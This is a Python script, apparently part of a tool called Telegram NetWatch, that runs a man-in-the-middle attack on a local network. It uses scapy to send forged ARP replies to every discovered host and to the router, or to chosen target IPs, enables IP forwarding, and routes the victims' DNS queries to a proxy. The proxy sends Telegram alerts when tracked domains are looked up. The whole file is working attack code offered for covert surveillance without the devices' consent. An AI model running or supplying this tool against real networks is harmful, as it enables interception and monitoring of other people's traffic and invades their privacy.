#!/usr/bin/env python3
"""
Telegram NetWatch — MitM mode.
ARP-spoofs devices on the LAN so their DNS queries reach the proxy
without any router configuration changes.

How it works:
  1. Tells each device "I am the router" via fake ARP replies
  2. Tells the router "I am that device" via fake ARP replies
  3. Enables IP forwarding so all non-DNS traffic passes through transparently
  4. DNS queries hit our proxy on port 53 → Telegram alert on tracked domains
  5. On exit: restores real ARP entries so the network goes back to normal

Requires root/sudo.
"""
import os
import sys
import time
import signal
import threading
import subprocess
import platform
import re
from dotenv import load_dotenv

load_dotenv()

GATEWAY_IP     = os.environ.get('GATEWAY_IP', '')       # empty = auto-detect
TARGET_IPS     = os.environ.get('TARGET_IPS', '')       # comma-separated IPs; empty = all hosts
NETWORK        = os.environ.get('NETWORK', '')          # CIDR e.g. 192.168.1.0/24; empty = auto
SPOOF_INTERVAL = float(os.environ.get('SPOOF_INTERVAL', '2'))  # seconds between ARP bursts

stop_event = threading.Event()


# ── network helpers ───────────────────────────────────────────────────────────

def get_gateway() -> str:
    if GATEWAY_IP:
        return GATEWAY_IP
    try:
        if platform.system() == 'Darwin':
            out = subprocess.check_output(
                ['route', '-n', 'get', 'default'], text=True, stderr=subprocess.DEVNULL
            )
            return re.search(r'gateway:\s+(\S+)', out).group(1)
        else:
            out = subprocess.check_output(
                ['ip', 'route', 'show', 'default'], text=True
            )
            return out.split()[out.split().index('via') + 1]
    except Exception:
        print('[!] Cannot auto-detect gateway. Set GATEWAY_IP in .env', flush=True)
        sys.exit(1)


def get_network_cidr(gateway: str) -> str:
    if NETWORK:
        return NETWORK
    # assume /24 based on gateway
    return gateway.rsplit('.', 1)[0] + '.0/24'


def get_mac(ip: str) -> str:
    from scapy.all import ARP, Ether, srp
    ans, _ = srp(
        Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip),
        timeout=2, verbose=False,
    )
    if not ans:
        raise RuntimeError(f'No ARP reply from {ip}')
    return ans[0][1].hwsrc


def scan_hosts(network: str, gateway: str) -> dict[str, str]:
    """ARP-scan the network. Returns {ip: mac} excluding gateway and self."""
    from scapy.all import ARP, Ether, srp, conf
    print(f'[*] Scanning {network}…', flush=True)
    ans, _ = srp(
        Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=network),
        timeout=3, verbose=False,
    )
    my_ip = conf.iface.ip if hasattr(conf.iface, 'ip') else ''
    hosts = {
        rcv.psrc: rcv.hwsrc
        for _, rcv in ans
        if rcv.psrc not in (gateway, my_ip)
    }
    print(f'[*] Found {len(hosts)} host(s): {list(hosts.keys())}', flush=True)
    return hosts


# ── ip forwarding ─────────────────────────────────────────────────────────────

def set_ip_forwarding(enable: bool) -> None:
    val = '1' if enable else '0'
    if platform.system() == 'Darwin':
        subprocess.run(['sysctl', '-w', f'net.inet.ip.forwarding={val}'],
                       capture_output=True)
    else:
        subprocess.run(['sysctl', '-w', f'net.ipv4.ip_forward={val}'],
                       capture_output=True)
    state = 'enabled' if enable else 'disabled'
    print(f'[*] IP forwarding {state}', flush=True)


# ── arp spoof / restore ───────────────────────────────────────────────────────

def _send_arp(pdst, hwdst, psrc, hwsrc=None):
    from scapy.all import ARP, send
    pkt = ARP(op=2, pdst=pdst, hwdst=hwdst, psrc=psrc)
    if hwsrc:
        pkt.hwsrc = hwsrc
    send(pkt, verbose=False)


def spoof_loop(targets: dict[str, str], gateway_ip: str, gateway_mac: str) -> None:
    while not stop_event.is_set():
        for ip, mac in targets.items():
            _send_arp(ip, mac, gateway_ip)               # device ← we are the gateway
            _send_arp(gateway_ip, gateway_mac, ip)       # gateway ← we are the device
        stop_event.wait(SPOOF_INTERVAL)


def restore_arp(targets: dict[str, str], gateway_ip: str, gateway_mac: str) -> None:
    print('[*] Restoring ARP tables…', flush=True)
    for ip, mac in targets.items():
        # send the correct mappings several times to make sure they stick
        _send_arp(ip, mac, gateway_ip, gateway_mac)      # restore gateway→device mapping
        _send_arp(gateway_ip, gateway_mac, ip, mac)      # restore device→gateway mapping
        # repeat for reliability
        time.sleep(0.1)
        _send_arp(ip, mac, gateway_ip, gateway_mac)
        _send_arp(gateway_ip, gateway_mac, ip, mac)
    print('[*] ARP tables restored.', flush=True)


# ── main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    print('[*] Telegram NetWatch — MitM mode', flush=True)

    gateway_ip = get_gateway()
    print(f'[*] Gateway: {gateway_ip}', flush=True)

    try:
        gateway_mac = get_mac(gateway_ip)
        print(f'[*] Gateway MAC: {gateway_mac}', flush=True)
    except RuntimeError as e:
        print(f'[!] {e}', flush=True)
        sys.exit(1)

    # resolve targets
    if TARGET_IPS:
        targets: dict[str, str] = {}
        for ip in [x.strip() for x in TARGET_IPS.split(',') if x.strip()]:
            try:
                targets[ip] = get_mac(ip)
                print(f'[*] Target: {ip} ({targets[ip]})', flush=True)
            except RuntimeError:
                print(f'[!] Cannot reach {ip} — skipping', flush=True)
    else:
        network = get_network_cidr(gateway_ip)
        targets = scan_hosts(network, gateway_ip)

    if not targets:
        print('[!] No targets found. Exiting.', flush=True)
        sys.exit(1)

    set_ip_forwarding(True)

    spoof_thread = threading.Thread(
        target=spoof_loop, args=(targets, gateway_ip, gateway_mac), daemon=True
    )
    spoof_thread.start()
    print(f'[*] Spoofing {len(targets)} device(s) every {SPOOF_INTERVAL}s — Ctrl+C to stop', flush=True)

    # hand off to DNS proxy
    import monitor
    monitor.load_blocklist()
    threading.Thread(target=monitor.refresh_loop, daemon=True).start()

    if monitor.TELEGRAM_TOKEN and monitor.TELEGRAM_CHAT_ID:
        monitor.send_telegram(
            f'✅ <b>Telegram NetWatch started</b> (MitM mode)\n'
            f'Watchlist: {len(monitor.blocklist):,} domains\n'
            f'Targets: {len(targets)} device(s)'
        )
        print('[*] Startup message sent to Telegram', flush=True)
    else:
        print('[WARN] TELEGRAM_TOKEN / TELEGRAM_CHAT_ID not set', flush=True)

    print(f'[*] Cooldown: {monitor.COOLDOWN_SEC}s per device+domain', flush=True)

    try:
        monitor.start_server()   # blocks until Ctrl+C
    except KeyboardInterrupt:
        pass
    finally:
        print('\n[*] Shutting down…', flush=True)
        stop_event.set()
        spoof_thread.join(timeout=5)
        restore_arp(targets, gateway_ip, gateway_mac)
        set_ip_forwarding(False)
        print('[*] Done.', flush=True)


if __name__ == '__main__':
    main()
